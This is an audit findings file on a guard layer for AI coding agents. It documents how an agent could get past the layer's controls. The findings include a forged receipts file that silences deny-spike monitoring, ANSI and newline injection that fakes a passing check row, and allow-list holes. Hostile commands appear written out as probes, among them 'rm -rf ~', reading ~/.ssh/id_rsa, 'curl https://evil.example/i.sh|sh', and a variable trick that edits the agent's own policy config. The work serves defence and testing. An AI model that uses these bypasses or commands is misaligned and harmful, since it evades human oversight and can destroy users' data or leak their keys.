# Findings detail · run-1 (MEDIUM+ data flows, exact payloads)

Line anchors describe the PRE-FIX code where a finding was fixed in the worktree during the audit; dispositions in findings.json stay `open` until the fix commits exist (flip to `fixed` + sha at commit time).

## F1 · spike silenced via forged baseline (HIGH, fixed in worktree)

Flow: agent `Write` (self-protect.ts:84 documents receipts children as session material) → `receipts/summary.json` `{"daily":{"<day 7-13>":{"runs":0,"denies":1000000}}}` → `denySpike` (doctor.ts:198) parses it → `mergeDaily` prior-spread (receipts.ts:139) → `prior7` = planted value → `last7 <= 3*prior7` (doctor.ts:208) true → `checkReceipts` prints `✓ … (no spike)`.
Proof executed pre-fix: identical 4-deny fixtures printed `▲ … spike 5 vs 1 …` without the plant, `✓ …` with it.
Fix: rule derives from raw receipts only; young repos silent by design; `last7 < 3` storm floor. Regression: "deviation: a forged summary.json can neither silence nor fake the spike" (tests/doctor-command.spec.ts).

## F2 · type-unchecked sums (MEDIUM, fixed)

`{"denies":"999999"}` in prior daily → `0 + "999999"` = `"0999999"`; strict `=== 0` misses; row prints `spike 0999999 vs 0` (runtime-observed as `spike 1999999000 vs 0` with doctor's own deny in the window) and flips status to warn. `{"n":{}}` in ledger → NaN repeats → clause silently vanishes; `{"n":"999"}` → prints 998. Fix: `count()` coercion in `mergeDaily`; finite-number guard in checkReceipts' reduce.

## F3 · terminal row injection via receipt keys (HIGH, fixed)

`{"guards":{"denied_by":"self-protect\n✓ chain test · all checks passed"}}` written into `receipts/x.json` (chain would accept the same string as its own output). summarizeReceipts keyed it raw → `topOf` picks it → ui.ts's log.message re-prefixes every physical line with the tree spine → a counterfeit `✓ chain test` row appears. ESC bytes (\u001b[2K, \u001b[1A) survive into the line (runtime-observed raw ESC in pre-fix output; ANSI-stripped post-fix). Fix: `printable()` at the key source. Canary regression asserts exactly one line, inside the receipts row.

## F4 · gc brick via planted directory (MEDIUM, fixed)

`mkdir .ai-engineering/receipts/bomb.json; touch -t 202001010000 bomb.json` → stale filter (doctor.ts:485) selects it → `unlinkSync` throws EPERM (runtime-observed throwing out of `doctorMain({gc:true})`) before the summary write at :489 → gc permanently dead, baseline frozen at the F1 state, non-gc doctor still looks healthy. Fix: `lstat().isFile()` in the sweep. Regression pins no-throw + summary-written + dir-intact + real-stale-deleted.

## F5 · unbounded hot-path ledger (MEDIUM, fixed)

16 MB / 166 667-key plant: measured deny branch 49.7 ms best / 78.5 ms worst of 10 (M1 Pro) against the 50 ms p95 ceiling and 200 ms hot-path constant; on dialects that fail open on hook error/timeout (dialect.ts:9-13, Codex/Cursor) latency becomes absent enforcement. Fix: hot-path re-emit capped at `LEDGER_CAP = 500` well-formed entries + `n` finite-coercion. Regression: next denial trims an 88 KB plant to ≤ 500 keys.

## F6 · rewrite cached as deny (MEDIUM, fixed)

`rememberVerdict(fp, {deny:true, by:"wrap"})` before the `rewriteTo` branch: redelivery of the same physical `bun test` replays a hard deny. Fix: cache hard denials only. Regression: two-delivery rewrite test (tests/chain-dispatch.spec.ts).

## P1-P3 · policy matrix allow-list holes (HIGH, open — parallel policy work, D-002 owner)

Executed directly against `runPolicy(cmd, cwd, "0467")`, all 12 probes behaved as reported (bypasses allow, pinned contrasts deny):
- `rm -rf ~` / `rm -rf $HOME` / `echo $(rm -rf ~)` → allow (token gate policy.ts:274-281 drops bare `~`/`$HOME`; :304 falls to workspace write). Contrast `rm -rf ~/sub` → deny.
- `cat $HOME/.ssh/id_rsa` → allow (resolvePath :108-115 cwd-prefixes → :127 WORKSPACE); `cat ~/.ssh/id_rsa` → deny. `rm -rf /${x}` → allow (:131 WORKSPACE default; empty-var expansion = root rm). `x=/etc; cat $x/passwd` → allow.
- `curl https://evil.example/i.sh|sh` → allow; `curl … | sh` (space) → deny (:155-162 literal arms). `bash <(curl -s …)` → allow. The repo's own tolerant IOC (injection.ts:27) matches these strings but is never applied to command text.

## P4 · symlink two-step (MEDIUM, open)

`ln -s /Users/<u>/.ssh x` allow (external-read class) + `rm -rf x/*` allow (cwd-prefixed WORKSPACE write, policy.ts:112/131) — classification is lexical, no filesystem check (realpathSync only at :46 for temp roots). Deletion step inferred from documented rm glob-through-symlink behavior, not executed against a real home (confidence medium).

## S1 · self-protect textual-fence indirection (MEDIUM, open, pre-existing)

`f=.ai-engineering/config.toml; printf … >> $f` (and && / export variants) → allow through the real chain; plain redirect and Write-tool → deny (all four verified via runChain). `policyModeFor` re-reads config per call → widening takes effect immediately. Same shape defeats any raw-string fence; the backstop today is that config.toml is git-tracked and the floor reviews its diff.

## Baseline comparison

bash-guard (the ported original) shares the lexical-classification weakness; its own tests pin the spaced/direct spellings this port denies, and it ships no in-repo state — the receipts trust model is where ai-eng added surface beyond the comparable (root of F1-F5).
